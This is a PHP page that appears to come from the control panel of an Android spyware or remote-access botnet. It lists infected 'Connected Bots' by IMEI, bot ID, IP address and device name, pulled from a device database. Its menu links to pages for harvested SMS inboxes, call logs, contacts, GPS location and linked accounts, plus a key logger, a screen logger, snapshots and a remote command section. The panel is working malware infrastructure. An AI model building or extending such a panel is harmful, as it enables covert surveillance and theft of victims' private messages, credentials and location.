<?php

session_start();

if ( isset( $_SESSION['user_id'] ) ) {

} else {
	       header("Location: ../index.php");

}
?>
<!DOCTYPE html>
<html lang="es">
<head>
	<meta charset="UTF-8">
		 <meta http-equiv="refresh" content="5"; URL="listbots.php">

	<script type='text/javascript' src='//code.jquery.com/jquery-1.10.1.js'></script>

	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
	<title>Laboratory</title>

	<!-- Normalize V8.0.1 -->
	<link rel="stylesheet" href="../css/normalize.css">

	<!-- Bootstrap V4.3 -->
	<link rel="stylesheet" href="../css/bootstrap.min.css">

	<!-- Bootstrap Material Design V4.0 -->
	<link rel="stylesheet" href="../css/bootstrap-material-design.min.css">

	<!-- Font Awesome V5.9.0 -->
	<link rel="stylesheet" href="../css/all.css">

	<!-- Sweet Alerts V8.13.0 CSS file -->
	<link rel="stylesheet" href="../css/sweetalert2.min.css">

	<!-- Sweet Alert V8.13.0 JS file-->
	<script src="../js/sweetalert2.min.js" ></script>

	<!-- jQuery Custom Content Scroller V3.1.5 -->
	<link rel="stylesheet" href="../css/jquery.mCustomScrollbar.css">
	
	<!-- General Styles -->
	<link rel="stylesheet" href="../css/style.css">


</head>
<body>
<style>
 #maintable td.white {color: #ffffff;}

.example_c {
color: #fffff !important;
text-transform: uppercase;
text-decoration: none;
background: #f0134d;
padding: 8px;
border: 2px solid #f0134d !important;
display: inline-block;
transition: all 0.4s ease 0s;
}
.example_c:hover {
color: #ffffff !important;
background: #fa697c;
border-color: #f0134d !important;
transition: all 0.4s ease 0s;
}

#snackbar {
  visibility: hidden;
  min-width: 250px;
  margin-left: -125px;
  background-color: #f34573;
  color: #fff;
  text-align: center;
  border-radius: 2px;
  padding: 14px;
  position: fixed;
  z-index: 1;
  left: 50%;
  bottom: 30px;
  font-size: 17px;
}

#snackbar.show {
  visibility: visible;
  -webkit-animation: fadein 0.5s, fadeout 0.5s 2.5s;
  animation: fadein 0.5s, fadeout 0.5s 2.5s;
}

@-webkit-keyframes fadein {
  from {bottom: 0; opacity: 0;} 
  to {bottom: 30px; opacity: 1;}
}

@keyframes fadein {
  from {bottom: 0; opacity: 0;}
  to {bottom: 30px; opacity: 1;}
}

@-webkit-keyframes fadeout {
  from {bottom: 30px; opacity: 1;} 
  to {bottom: 0; opacity: 0;}
}

@keyframes fadeout {
  from {bottom: 30px; opacity: 1;}
  to {bottom: 0; opacity: 0;}
}
</style>

	
	<!-- Main container -->
	<main class="full-box main-container">
		<!-- Nav lateral -->
		<section class="full-box nav-lateral">
			<div class="full-box nav-lateral-bg show-nav-lateral"></div>
			<div class="full-box nav-lateral-content">
			<nav class="full-box nav-lateral-menu">
					<ul>
				<li>
							<a href="home.php"><i class="fab fa-dashcube fa-fw"></i> &nbsp; Dashboard</a>
						</li>
						</ul>
						</nav>
				<div class="full-box nav-lateral-bar"></div>
			<nav class="full-box nav-lateral-menu">
					<ul>
					<li>
							<a href="#" class="nav-btn-submenu"><i class="fas fa-radiation-alt"></i> &nbsp; Miscellaneous <i class="fas fa-chevron-down"></i></a>
							<ul>
								<li><a href="Devinfo.php"><i class="fas fa-mobile-alt fa-fw"></i> &nbsp; Device Info</a></li>
								<li><a href="inboxsms.php"><i class="fas fa-boxes fa-inbox"></i> &nbsp; Inbox Messages</a></li>
								<li><a href="calogs.php"><i class="fas fa-phone-square-alt fa-fw"></i> &nbsp; Call Logs</a></li>
								<li><a href="contacts.php"><i class="fas fa-id-badge fa-fw"></i> &nbsp; Contacts</a></li>
								<li><a href="gps.php"><i class="fas fa-map fa-fw"></i> &nbsp; GPS</a></li>
		                        <li><a href="accounts.php"><i class="fas fa-user-alt"></i> &nbsp; Linked Accounts </a></li>
								
							</ul>
							
						</li>
						
						
						<li>
							<a href="#" class="nav-btn-submenu"><i class="fas fa-subscript fa-fw"></i> &nbsp; Loggers <i class="fas fa-chevron-down"></i></a>
							<ul>
								<li><a href="../zathura/screenlog.php"><i class="fas fa-desktop fa-fw"></i> &nbsp; Screen Logger</a></li>
								<li><a href="../zathura/snapshot.php"><i class="fas fa-expand fa-fw"></i> &nbsp; SnapShots</a></li>
								<li><a href="keystrokes.php"><i class="fab fa-twitch"></i> &nbsp; Key Logger</a></li>

							</ul>
						</li>
						
						<li>
						   <a href="../zathura/rogue.php"><i class="fab fa-battle-net"></i></i> &nbsp; Rogue</a>

							<ul>

							</ul>
						</li>
						

						<li>
						   <a href="../zathura/toggle.php"><i class="fas fa-bolt"></i> &nbsp; Toggle</a>

							<ul>


							</ul>
						</li>
                             
                      

                        <li>
							<a href="#" class="nav-btn-submenu"><i class="fab fa-gitkraken fa-fw"></i> &nbsp; Command <i class="fas fa-chevron-down"></i></a>
							<ul>

							<li><a href="../zathura/status.php"><i class="fab fa-hubspot fa-fw"></i> &nbsp; Status</a></li>
								<li><a href="../zathura/history.php"><i class="fab fa-buffer fa-fw"></i> &nbsp; History</a></li>
								
						
							</ul>
				</nav>
			</div>
		</section>

		<!-- Page content -->
		<section class="full-box page-content">
			<nav class="full-box navbar-info">
				
				<a href="index.php" class="btn-exit-system"><i class="fas fa-power-off"></i></a>
			</nav>

			<!-- Page header -->
			<div class="full-box page-header">
				<h3 class="text-left">
				</h3>
				
			</div>
			
			<div class="container-fluid">
				<ul class="full-box list-unstyled page-nav-tabs">
					
					<li>
						<a class="active" href="listadmin.html"> &nbsp; Connected Bots</a>
					</li>
				</ul>	
			</div>
			
			<!-- Content -->
			<div class="container-fluid">
				<div class="table-responsive">
					<table class="table table-dark table-sm"  id="maintable">
						<thead>
							<tr class="text-left roboto-medium">
								<th>IMEI</th>
								<th>BOT ID</th>
								<th>IP Address</th>
					            <th>Device</th>

							</tr>
						</thead>
						<tbody>
							<tr class="text-center" >
								
							
									<td><a href="Devinfo.php" onclick='clickfunc(this)'>
								
								 <?php 
 
                   include 'DatabaseConfig.php' ;
 
                  $mysqli = mysqli_connect($HostName,$HostUser,$HostPass,$DatabaseName);
				    $content =  file_get_contents("../config.txt");
                 $query = ("SELECT clm_id, clm_device_id, clm_registered,clm_device_name,clm_ip FROM `tbl_device`" );

 
                 if ($result = $mysqli->query($query)) {
                     while ($row = $result->fetch_assoc()) {
                   $field1name = $row["clm_id"];
                    $field2name = $row["clm_device_id"];
                     $field3name = $row["clm_registered"];
                       $field4name = $row["clm_device_name"];
                         $field5name = $row["clm_ip"];

						 
 
        echo '<tr> 
		<td> <a href="Devinfo.php" onclick="clickfunc(this)">'.$field2name.'</a></td>
				   <td class ="white" >'.$field1name.'</td> 

                  <td class ="white">'.$field5name.'</td>
			       <td class ="white">'.$field4name.'</td>
				 <script type="text/javascript">
                 var pomp = "<?php echo '.$field2name.'; ?>";
				 </script>
				   
				  
			
              </tr>';
    }
    $result->free();
} 
?>
			
								
								
							
								
							</tr>
							
							
						
						</tbody>
					</table>
				
			
			</div>

		</section>

		<!-- Help Modal -->
		<div class="modal fade" id="ModalHelp" tabindex="-1" role="dialog" aria-labelledby="ModalHelpTitle" aria-hidden="true">
			<div class="modal-dialog modal-dialog-centered" role="document">
				<div class="modal-content">
					<div class="modal-header">
						<h5 class="modal-title roboto-medium text-center" id="exampleModalLongTitle">Modal title</h5>
						<button type="button" class="close" data-dismiss="modal" aria-label="Close">
							<span aria-hidden="true">&times;</span>
						</button>
					</div>
					<div class="modal-body">
					</div>
				<div class="modal-footer">
					<button type="button" class="btn btn-light roboto-condensed-regular" data-dismiss="modal">Close</button>
					&nbsp;
					<button type="button" class="btn btn-light roboto-condensed-regular">Save changes</button>
				</div>
				</div>
			</div>
		</div>
	</main>
	
	
	<!--=============================================
	=            Include JavaScript files           =
	==============================================-->
	<!-- jQuery V3.4.1 -->
	<script src="../js/jquery-3.4.1.min.js" ></script>

	<!-- popper -->
	<script src="../js/popper.min.js" ></script>

	<!-- Bootstrap V4.3 -->
	<script src="../js/bootstrap.min.js" ></script>

	<!-- jQuery Custom Content Scroller V3.1.5 -->
	<script src="../js/jquery.mCustomScrollbar.concat.min.js" ></script>

	<!-- Bootstrap Material Design V4.0 -->
	<script src="../js/bootstrap-material-design.min.js" ></script>
	<script>$(document).ready(function() { $('body').bootstrapMaterialDesign(); });</script>

	<script src="../js/main.js" ></script>
	 <script>
							  function clickfunc(obj) {
                                 var t = $(obj).text();
								   $.post('config.php', { text: t, function(data) { 
                                   console.log(data); 
                                   }});
                                  
								 }
								 </script>
								 
								 <script type="text/javascript">
	
							  function goclear(imei) 
							  {
								  
				                  alert(imei);

								  var secret = imei;
								   var x = document.getElementById("snackbar");
                              x.className = "show";
                                setTimeout(function(){ x.className = x.className.replace("show", ""); }, 4000);
                                 
								   $.post('config.php', { text: secret, function(data) { 
                                   console.log(data); 
                                   }});
                                  
								 }


</script>
</body>
</html>